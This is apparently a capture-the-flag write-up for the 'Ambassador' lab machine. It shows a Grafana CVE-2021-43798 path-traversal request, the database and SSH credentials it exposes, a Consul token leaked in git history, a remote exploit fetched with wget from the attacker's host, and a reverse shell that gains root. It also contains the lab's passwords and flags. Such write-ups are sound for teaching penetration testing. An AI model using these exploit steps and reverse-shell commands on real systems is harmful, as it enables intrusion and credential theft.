# Ambassador

```bash
	export IP = 10.10.11.183
```

# Enumuration

1. Nmap:
```
	Nmap scan report for 10.10.11.183
Host is up (0.29s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 30 Jan 2023 16:10:02 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 30 Jan 2023 16:09:25 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 30 Jan 2023 16:09:31 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 19
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, SupportsLoadDataLocal, ConnectWithDatabase, Speaks41ProtocolOld, Support41Auth, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsTransactions, IgnoreSigpipes, LongPassword, InteractiveClient, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, FoundRows, Speaks41ProtocolNew, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: z     \x1CvM#\x01>ckI]Wj"!Eq\x02\
|_  Auth Plugin Name: caching_sha2_password
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.92%I=7%D=1/30%Time=63D7EBB5%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Mon,\x2030\x20Jan\x202023\x2016:09
SF::25\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mo
SF:n,\x2030\x20Jan\x202023\x2016:09:31\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Mon,\x2030\x20Jan\x202023\x2016:10:02\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.30 seconds

```
URL: 10.10.11.183:3000
```/login

	GRAFANA v8.3.0 Vulnerbility CVE-2021-43798
```
# Exploition:
```
Request:
------
	GET /public/plugins/mysql/../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
	Host: 10.10.11.183:3000

Response:
-------
	garafan.ini file

Commands:
---------
	> cat grafana.ini | grep -v '^#\|^;'|grep .

		admin_password = messageInABottle685427

1.Login with admin cred
2.search mysql plugins	
3. find db creds

MySQL:
-----
excute file: 
			var/lib/grafana/grafana.db   	#using burp
save as grafana.db

Commands:
--------
		> curl --path-as-is http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana2.db

		> mysql -h 10.10.11.183 -u grafana -p 
			[dontStandSoCloseToMe63221!]

		MySQL [(none)]>show databases;
		MySQL [(none)]>use whackywidget;
		MySQL [whackywidget]> show tabels;
		MySQL [whackywidget]> select * from users;
		+-----------+------------------------------------------+
		| user      | pass                                     |
		+-----------+------------------------------------------+
		| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
		+-----------+------------------------------------------+
1 row in set (1.320 sec)

		> ssh developer@10.10.11.183
		pass: anEnglishManInNewYork027468
.....

SQLLITE3
.....
	> sqllite3 grafana.db
 		sqllite > .tables
 		alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token   

	sqllite> select user,password,database from data_source;
				"grafana|dontStandSoCloseToMe63221!|grafana"
...
```
# Preveliage Escalation :
------------------------

```
GIT
...
	> git log
	> git show 33a53ef9a207976d5ceceddc41a199558843bf3c
	-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
	+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD

[bb03b43b-1d81-d62b-24b5-39540ee469b5]
...

Python Reverse exploit file
----------------------------

> URL: https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API
Download: exploit.py

	> python3 -m http.server 8000

Target Machine:
	> wget http://10.10.14.65:8000/exploit-sys.py
	> python3 exploit-sys.py -rh 127.0.0.1 -rp 8500 -lh 10.10.14.65 -lp 4444 -tk bb03b43b-1d81-d62b-24b5-39540ee469b5 

	[+] Request sent successfully, check your listener

...

NC Listener
-----------
	nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.11.183] 44090
bash: cannot set terminal process group (1840): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/# cd root
root@ambassador:~# ls -l
ls -l
total 12
-rwxr-xr-x 1 root root   62 Sep 14 11:00 cleanup.sh
-rw-r----- 1 root root   33 Feb  8 15:39 root.txt
drwx------ 3 root root 4096 Mar 13  2022 snap
root@ambassador:~# cat root.txt 
cat root.txt
7a7726cfadb36dfbab218295411a0159
root@ambassador:~#
```
Target Found:

USER.txt
...
	50bbce61eb9c9540529f4cfeec657d60
...

ROOT.txt
...
	7a7726cfadb36dfbab218295411a0159
...

